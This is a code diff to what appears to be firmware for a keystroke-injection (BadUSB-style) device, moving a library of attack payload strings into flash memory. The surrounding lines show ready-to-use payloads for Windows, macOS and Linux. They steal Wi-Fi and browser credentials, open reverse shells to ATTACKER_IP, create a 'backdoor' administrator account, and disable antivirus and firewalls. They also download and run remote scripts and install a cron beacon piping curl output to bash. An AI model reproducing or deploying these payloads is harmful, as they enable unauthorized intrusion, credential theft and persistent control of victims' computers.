@@ -52,7 +52,7 @@ static const char* PAYLOAD_NAMES[] = {
 // WINDOWS PAYLOADS
 // =============================================================================
 
-static const char* WIN_WIFI_PASSWORDS =
+static const char WIN_WIFI_PASSWORDS[] PROGMEM =
     "GUI:r\n"
     "DELAY:800\n"
     "CMD:powershell -WindowStyle Hidden -Command \""
@@ -63,7 +63,7 @@ static const char* WIN_WIFI_PASSWORDS =
     "notepad $env:TEMP\\wifi_pass.txt\"\n"
     "ENTER\n";
 
-static const char* WIN_SYSTEM_INFO =
+static const char WIN_SYSTEM_INFO[] PROGMEM =
     "GUI:r\n"
     "DELAY:800\n"
     "CMD:powershell -WindowStyle Hidden -Command \""
@@ -79,7 +79,7 @@ static const char* WIN_SYSTEM_INFO =
     "notepad $env:TEMP\\sysinfo.txt\"\n"
     "ENTER\n";
 
-static const char* WIN_REVERSE_SHELL =
+static const char WIN_REVERSE_SHELL[] PROGMEM =
     "GUI:r\n"
     "DELAY:800\n"
     "CMD:powershell -WindowStyle Hidden -Command \""
@@ -95,7 +95,7 @@ static const char* WIN_REVERSE_SHELL =
     "$c.Close()\"\n"
     "ENTER\n";
 
-static const char* WIN_CREATE_ADMIN =
+static const char WIN_CREATE_ADMIN[] PROGMEM =
     "GUI:r\n"
     "DELAY:800\n"
     "CMD:powershell -WindowStyle Hidden -Command \"Start-Process cmd -Verb RunAs -ArgumentList '/c net user backdoor P@ss123! /add && net localgroup administrators backdoor /add'\"\n"
@@ -103,7 +103,7 @@ static const char* WIN_CREATE_ADMIN =
     "DELAY:2000\n"
     "ENTER\n";
 
-static const char* WIN_DISABLE_AV =
+static const char WIN_DISABLE_AV[] PROGMEM =
     "GUI:r\n"
     "DELAY:800\n"
     "CMD:powershell -WindowStyle Hidden -Command \"Start-Process powershell -Verb RunAs -ArgumentList '-Command Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableBlockAtFirstSeen $true -DisableIOAVProtection $true'\"\n"
@@ -111,7 +111,7 @@ static const char* WIN_DISABLE_AV =
     "DELAY:2000\n"
     "ENTER\n";
 
-static const char* WIN_DOWNLOAD_EXEC =
+static const char WIN_DOWNLOAD_EXEC[] PROGMEM =
     "GUI:r\n"
     "DELAY:800\n"
     "CMD:powershell -WindowStyle Hidden -Command \""
@@ -120,7 +120,7 @@ static const char* WIN_DOWNLOAD_EXEC =
     "Start-Process $env:TEMP\\update.exe\"\n"
     "ENTER\n";
 
-static const char* WIN_BROWSER_CREDS =
+static const char WIN_BROWSER_CREDS[] PROGMEM =
     "GUI:r\n"
     "DELAY:800\n"
     "CMD:powershell -WindowStyle Hidden -Command \""
@@ -133,7 +133,7 @@ static const char* WIN_BROWSER_CREDS =
     "notepad $env:TEMP\\browser_done.txt\"\n"
     "ENTER\n";
 
-static const char* WIN_PERSISTENCE =
+static const char WIN_PERSISTENCE[] PROGMEM =
     "GUI:r\n"
     "DELAY:800\n"
     "CMD:powershell -WindowStyle Hidden -Command \""
@@ -145,7 +145,7 @@ static const char* WIN_PERSISTENCE =
 // MAC PAYLOADS
 // =============================================================================
 
-static const char* MAC_WIFI_PASSWORDS =
+static const char MAC_WIFI_PASSWORDS[] PROGMEM =
     "GUI:SPACE\n"
     "DELAY:500\n"
     "CMD:Terminal\n"
@@ -154,7 +154,7 @@ static const char* MAC_WIFI_PASSWORDS =
     "CMD:security find-generic-password -ga \"$(networksetup -getairportnetwork en0 | cut -d: -f2 | tr -d ' ')\" 2>&1 | grep password > /tmp/wifi_pass.txt; open /tmp/wifi_pass.txt\n"
     "ENTER\n";
 
-static const char* MAC_SYSTEM_INFO =
+static const char MAC_SYSTEM_INFO[] PROGMEM =
     "GUI:SPACE\n"
     "DELAY:500\n"
     "CMD:Terminal\n"
@@ -163,7 +163,7 @@ static const char* MAC_SYSTEM_INFO =
     "CMD:echo '=== HOSTNAME ===' > /tmp/sysinfo.txt; hostname >> /tmp/sysinfo.txt; echo '=== IP ===' >> /tmp/sysinfo.txt; ifconfig >> /tmp/sysinfo.txt; echo '=== USERS ===' >> /tmp/sysinfo.txt; dscl . list /Users | grep -v '_' >> /tmp/sysinfo.txt; echo '=== ARP ===' >> /tmp/sysinfo.txt; arp -a >> /tmp/sysinfo.txt; open /tmp/sysinfo.txt\n"
     "ENTER\n";
 
-static const char* MAC_REVERSE_SHELL =
+static const char MAC_REVERSE_SHELL[] PROGMEM =
     "GUI:SPACE\n"
     "DELAY:500\n"
     "CMD:Terminal\n"
@@ -172,7 +172,7 @@ static const char* MAC_REVERSE_SHELL =
     "CMD:bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &\n"
     "ENTER\n";
 
-static const char* MAC_CREATE_ADMIN =
+static const char MAC_CREATE_ADMIN[] PROGMEM =
     "GUI:SPACE\n"
     "DELAY:500\n"
     "CMD:Terminal\n"
@@ -181,7 +181,7 @@ static const char* MAC_CREATE_ADMIN =
     "CMD:sudo dscl . -create /Users/backdoor; sudo dscl . -create /Users/backdoor UserShell /bin/bash; sudo dscl . -create /Users/backdoor UniqueID 599; sudo dscl . -create /Users/backdoor PrimaryGroupID 80; sudo dscl . -passwd /Users/backdoor 'P@ss123!'; sudo dscl . -append /Groups/admin GroupMembership backdoor\n"
     "ENTER\n";
 
-static const char* MAC_DISABLE_AV =
+static const char MAC_DISABLE_AV[] PROGMEM =
     "GUI:SPACE\n"
     "DELAY:500\n"
     "CMD:Terminal\n"
@@ -190,7 +190,7 @@ static const char* MAC_DISABLE_AV =
     "CMD:sudo spctl --master-disable; sudo defaults write com.apple.LaunchServices LSQuarantine -bool NO\n"
     "ENTER\n";
 
-static const char* MAC_DOWNLOAD_EXEC =
+static const char MAC_DOWNLOAD_EXEC[] PROGMEM =
     "GUI:SPACE\n"
     "DELAY:500\n"
     "CMD:Terminal\n"
@@ -199,7 +199,7 @@ static const char* MAC_DOWNLOAD_EXEC =
     "CMD:curl -s http://ATTACKER_IP/payload.sh -o /tmp/update.sh && chmod +x /tmp/update.sh && /tmp/update.sh &\n"
     "ENTER\n";
 
-static const char* MAC_BROWSER_CREDS =
+static const char MAC_BROWSER_CREDS[] PROGMEM =
     "GUI:SPACE\n"
     "DELAY:500\n"
     "CMD:Terminal\n"
@@ -208,7 +208,7 @@ static const char* MAC_BROWSER_CREDS =
     "CMD:cp ~/Library/Application\\ Support/Google/Chrome/Default/Login\\ Data /tmp/chrome_logins.db 2>/dev/null; cp ~/Library/Application\\ Support/Firefox/Profiles/*/logins.json /tmp/ff_logins.json 2>/dev/null; echo 'Done' > /tmp/browser_done.txt; open /tmp/browser_done.txt\n"
     "ENTER\n";
 
-static const char* MAC_PERSISTENCE =
+static const char MAC_PERSISTENCE[] PROGMEM =
     "GUI:SPACE\n"
     "DELAY:500\n"
     "CMD:Terminal\n"
@@ -221,49 +221,49 @@ static const char* MAC_PERSISTENCE =
 // LINUX PAYLOADS
 // =============================================================================
 
-static const char* LIN_WIFI_PASSWORDS =
+static const char LIN_WIFI_PASSWORDS[] PROGMEM =
     "CTRL:ALT:t\n"
     "DELAY:1000\n"
     "CMD:sudo grep -r psk= /etc/NetworkManager/system-connections/ 2>/dev/null > /tmp/wifi_pass.txt; cat /tmp/wifi_pass.txt\n"
     "ENTER\n";
 
-static const char* LIN_SYSTEM_INFO =
+static const char LIN_SYSTEM_INFO[] PROGMEM =
     "CTRL:ALT:t\n"
     "DELAY:1000\n"
     "CMD:echo '=== HOSTNAME ===' > /tmp/sysinfo.txt; hostname >> /tmp/sysinfo.txt; echo '=== IP ===' >> /tmp/sysinfo.txt; ip a >> /tmp/sysinfo.txt; echo '=== USERS ===' >> /tmp/sysinfo.txt; cat /etc/passwd | grep -v nologin >> /tmp/sysinfo.txt; echo '=== ARP ===' >> /tmp/sysinfo.txt; arp -a >> /tmp/sysinfo.txt; echo '=== NETSTAT ===' >> /tmp/sysinfo.txt; ss -tulpn >> /tmp/sysinfo.txt; cat /tmp/sysinfo.txt\n"
     "ENTER\n";
 
-static const char* LIN_REVERSE_SHELL =
+static const char LIN_REVERSE_SHELL[] PROGMEM =
     "CTRL:ALT:t\n"
     "DELAY:1000\n"
     "CMD:bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &\n"
     "ENTER\n";
 
-static const char* LIN_CREATE_ADMIN =
+static const char LIN_CREATE_ADMIN[] PROGMEM =
     "CTRL:ALT:t\n"
     "DELAY:1000\n"
     "CMD:sudo useradd -m -s /bin/bash -G sudo backdoor; echo 'backdoor:P@ss123!' | sudo chpasswd\n"
     "ENTER\n";
 
-static const char* LIN_DISABLE_AV =
+static const char LIN_DISABLE_AV[] PROGMEM =
     "CTRL:ALT:t\n"
     "DELAY:1000\n"
     "CMD:sudo systemctl stop apparmor 2>/dev/null; sudo ufw disable 2>/dev/null; sudo iptables -F 2>/dev/null; echo 'Defenses disabled'\n"
     "ENTER\n";
 
-static const char* LIN_DOWNLOAD_EXEC =
+static const char LIN_DOWNLOAD_EXEC[] PROGMEM =
     "CTRL:ALT:t\n"
     "DELAY:1000\n"
     "CMD:curl -s http://ATTACKER_IP/payload.sh -o /tmp/update.sh && chmod +x /tmp/update.sh && /tmp/update.sh &\n"
     "ENTER\n";
 
-static const char* LIN_BROWSER_CREDS =
+static const char LIN_BROWSER_CREDS[] PROGMEM =
     "CTRL:ALT:t\n"
     "DELAY:1000\n"
     "CMD:cp ~/.config/google-chrome/Default/Login\\ Data /tmp/chrome_logins.db 2>/dev/null; cp ~/.mozilla/firefox/*.default*/logins.json /tmp/ff_logins.json 2>/dev/null; echo 'Browser DBs copied to /tmp' && ls -la /tmp/*login* /tmp/*ff_*\n"
     "ENTER\n";
 
-static const char* LIN_PERSISTENCE =
+static const char LIN_PERSISTENCE[] PROGMEM =
     "CTRL:ALT:t\n"
     "DELAY:1000\n"
     "CMD:echo '*/5 * * * * curl -s http://ATTACKER_IP/beacon.sh | bash' | crontab -; echo 'Persistence installed'\n"
